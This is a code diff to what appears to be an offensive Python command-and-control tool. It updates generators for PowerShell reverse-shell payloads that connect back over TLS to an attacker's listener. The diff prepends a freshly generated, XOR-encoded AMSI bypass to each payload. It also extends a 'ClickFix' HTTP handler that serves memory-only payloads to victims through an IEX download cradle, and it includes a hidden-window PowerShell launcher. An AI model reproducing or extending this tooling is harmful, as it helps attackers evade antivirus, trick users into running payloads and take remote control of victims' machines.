@@ -464,8 +464,10 @@ def obfuscate_protocol_strings(script):
     return script
 
 def get_tls_payload(ip, port, secret):
-    """Generate TLS+handshake payload for persistence scripts."""
-    return f'''while(1){{try{{
+    """Generate TLS+handshake payload for persistence scripts with AMSI bypass."""
+    # Get fresh AMSI bypass
+    amsi = get_amsi_bypass()
+    return f'''{amsi};while(1){{try{{
 $h="{ip}";$p={port};$secret="{secret}";
 $t=New-Object Net.Sockets.TcpClient($h,$p);
 $ssl=New-Object Net.Security.SslStream($t.GetStream(),$false,({{$true}}));
@@ -743,13 +745,18 @@ class ClickFixHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         ip = CFG.get_ip()
         port = CFG.listener_port
+        cert_thumbprint = self._get_cert_thumbprint() if hasattr(self, '_get_cert_thumbprint') else None
         
         if self.path == '/s':
             # Memory-only payload for IEX download cradle
-            # Victim runs: IEX(IWR http://IP:PORT/s -UseBasic).Content
+            # Now includes: AMSI bypass + Certificate pinning + TLS shell
             secret = CFG.handshake_secret
             
-            core_payload = f'''while($true){{try{{
+            # Get AMSI bypass (XOR encoded)
+            amsi_bypass = get_amsi_bypass()
+            
+            # Build payload with AMSI bypass prepended
+            core_payload = f'''{amsi_bypass};while($true){{try{{
 $h='{ip}';$p={CFG.listener_port};$secret='{secret}';
 $t=New-Object Net.Sockets.TcpClient($h,$p);
 $ssl=New-Object Net.Security.SslStream($t.GetStream(),$false,({{$true}}));
@@ -817,8 +824,11 @@ W.Run "cmd /c powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass 
             # Includes AMSI bypass + variable obfuscation for evasion
             secret = CFG.handshake_secret
             
-            # Core payload (before obfuscation)
-            core_payload = f'''while($true){{try{{
+            # Get AMSI bypass (XOR encoded, regenerated each time)
+            amsi_bypass = get_amsi_bypass()
+            
+            # Core payload with AMSI bypass prepended
+            core_payload = f'''{amsi_bypass};while($true){{try{{
 $h='{ip}';$p={CFG.listener_port};$secret='{secret}';
 $t=New-Object Net.Sockets.TcpClient($h,$p);
 $ssl=New-Object Net.Security.SslStream($t.GetStream(),$false,({{$true}}));
